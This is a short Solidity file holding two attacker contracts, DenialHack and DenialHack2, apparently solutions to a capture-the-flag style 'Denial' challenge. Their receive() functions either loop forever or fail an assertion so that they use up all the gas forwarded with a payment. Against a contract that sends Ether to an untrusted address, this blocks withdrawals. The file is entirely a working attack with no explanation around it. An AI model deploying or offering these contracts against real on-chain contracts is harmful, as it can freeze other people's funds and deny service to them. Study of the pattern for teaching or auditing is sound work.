// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

contract DenialHack {
    receive() payable external {
        while(true) {} // to consume all gas
    }
}


// method 2

contract DenialHack2 {

    receive() payable external {
        assert(false); // to consume all gas
    }
}
